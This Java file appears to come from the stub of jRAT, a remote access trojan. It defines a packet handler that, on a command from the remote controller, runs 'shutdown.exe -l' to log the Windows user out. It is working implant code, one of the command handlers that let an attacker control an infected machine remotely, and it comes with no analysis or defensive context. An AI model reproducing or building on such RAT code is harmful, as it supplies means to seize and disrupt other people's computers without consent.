package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import oslib.OperatingSystem;

public class Packet30LogoutComputer extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec("shutdown.exe -l");
		}
	}

}